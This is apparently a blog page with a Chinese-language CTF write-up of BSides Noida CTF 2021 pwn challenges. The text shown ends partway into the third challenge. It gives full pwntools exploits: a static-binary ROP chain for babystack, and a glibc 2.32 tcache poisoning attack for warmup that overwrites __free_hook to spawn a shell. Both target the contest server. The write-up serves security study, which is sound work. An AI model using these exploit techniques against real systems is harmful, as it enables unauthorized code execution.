<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>BSides Noida CTF 2021 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="BSides Noida CTF 2021" />
<meta property="og:description" content="周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺
url: https://ctftime.org/event/1397  rank 8 with lilac" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-08-18T16:19:15+08:00" />
<meta property="article:modified_time" content="2021-08-18T16:19:15+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://xidoo.top/logo.png"/>

<meta name="twitter:title" content="BSides Noida CTF 2021"/>
<meta name="twitter:description" content="周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺
url: https://ctftime.org/event/1397  rank 8 with lilac"/>
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2021/08/bsides-noida-ctf-2021/" /><link rel="prev" href="http://xidoo.top/2021/07/qwb2021/" /><link rel="next" href="http://xidoo.top/2021/08/hxp2020/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "BSides Noida CTF 2021",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/xidoo.top\/2021\/08\/bsides-noida-ctf-2021\/"
        },"genre": "posts","wordcount":  5601 ,
        "url": "http:\/\/xidoo.top\/2021\/08\/bsides-noida-ctf-2021\/","datePublished": "2021-08-18T16:19:15+08:00","dateModified": "2021-08-18T16:19:15+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "x1do0"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">BSides Noida CTF 2021</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>PWN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-18">2021-08-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5601 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;27 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#babystack">babystack</a></li>
    <li><a href="#warmup">warmup</a></li>
    <li><a href="#khop">khop</a></li>
    <li><a href="#baby_musl">baby_musl</a></li>
    <li><a href="#teensum">teensum</a></li>
    <li><a href="#suscall">suscall</a></li>
    <li><a href="#trash">trash</a></li>
    <li><a href="#interpreter">Interpreter</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>周末和学弟学妹一起打的一场比赛，比较基础，但涉及的知识面较广，有必要整理查漏补缺
url: <a href="https://ctftime.org/event/1397" target="_blank" rel="noopener noreffer">https://ctftime.org/event/1397</a>  rank 8 with lilac</p>
<ul>
<li>babystack: static link, find gadget to trigger your own syscall and ROP</li>
<li>warmup: glibc2.32 (lastest version) tcache exploitation, xor bypass</li>
<li>khop: basic linux kernel exploits, use-after-free and zero deference</li>
<li>babymusl: musl libc heap exploits, unlink vulnerability and ROP</li>
<li>suscall: basic linux kernel exploits, bugged syscall implemented by host</li>
<li>trash: glibc2.32 off-by-null, trigger heap overlapping and double free</li>
<li>Interpreter: virtual machine exploits, out-of-bound read and write</li>
</ul>
<h2 id="babystack">babystack</h2>
<p>明显的栈溢出。</p>
<p>静态编译，什么gadget都有，syscall只开了orw，但是并没有找到open。</p>
<p>那就自己凑syscall吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34; x1do0 / Lilac &#34;&#34;&#34;</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>

<span class="c1"># io = process(&#34;./babystack.out&#34;)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.136.150.230&#34;</span><span class="p">,</span> <span class="mi">49156</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">open64</span> <span class="o">=</span> <span class="mh">0x442BA0</span>
<span class="n">read</span> <span class="o">=</span> <span class="mh">0x442CD0</span>
<span class="n">write</span> <span class="o">=</span> <span class="mh">0x442D70</span>
<span class="n">prdir</span> <span class="o">=</span> <span class="mh">0x00000000004018f4</span>
<span class="n">prsir</span> <span class="o">=</span> <span class="mh">0x000000000040970e</span>
<span class="n">prdxr</span> <span class="o">=</span> <span class="mh">0x000000000040182f</span>
<span class="n">praxr</span> <span class="o">=</span> <span class="mh">0x0000000000410da4</span>
<span class="n">mov_rax_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000413b14</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x442D85</span>
<span class="n">mprotect</span> <span class="o">=</span> <span class="mh">0x443AF0</span>

<span class="n">target</span> <span class="o">=</span> <span class="mh">0x4bc000</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="n">prdir</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="n">target</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">prdxr</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">read</span><span class="p">,</span>
    <span class="n">prdir</span><span class="p">,</span> <span class="n">target</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">praxr</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">syscall</span><span class="p">,</span>
    <span class="n">prdir</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="n">target</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">prdxr</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">read</span><span class="p">,</span>
    <span class="n">prdir</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">prsir</span><span class="p">,</span> <span class="n">target</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">prdxr</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">write</span><span class="p">)</span>

<span class="c1"># gdb.attach(io, &#34;b *0x442D85&#34;)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="warmup">warmup</h2>
<p>2.32的新版本堆，明显的uaf，增删改打印功能齐全。还是改tcache的fd，打到free_hook，但是需要绕过tcache的异或检测。只需要在分配第一个tcache时uaf泄露出fd位置，便是异或的key（一开始的fd是0）。</p>
<p>详见 <a href="https://cloud.tencent.com/developer/article/1643954" target="_blank" rel="noopener noreffer">https://cloud.tencent.com/developer/article/1643954</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34; yty &amp; wangjihe / Lilac &#34;&#34;&#34;</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">libc_path</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/glibc/2.32-0ubuntu3_amd64/libc-2.32.so&#34;</span>
<span class="n">elf_path</span> <span class="o">=</span> <span class="s2">&#34;./a.out&#34;</span>

<span class="n">gdb_args</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b *(0x555555554000 + 0x13B5)
</span><span class="s1">b *(0x555555554000 + 0x16A2)
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf_path</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf_path</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">tob</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>


<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdb_args</span><span class="p">)</span>
<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">int</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">str</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.136.150.230&#34;</span><span class="p">,</span> <span class="mi">49153</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;=6= exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;sz: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">save</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">choice</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;idx: &#34;</span><span class="p">,</span> <span class="n">tob</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x500</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="c1"># 0x55555555b6e0</span>
<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
<span class="n">rm</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;data: &#34;</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>

<span class="n">rm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;data: &#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e4030</span>
<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>


<span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
<span class="n">rm</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
<span class="n">save</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">rm</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">rm</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="khop">khop</h2>
<p>全局变量message uaf，开两个fd，close其中一个，另外一个还可以接着用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
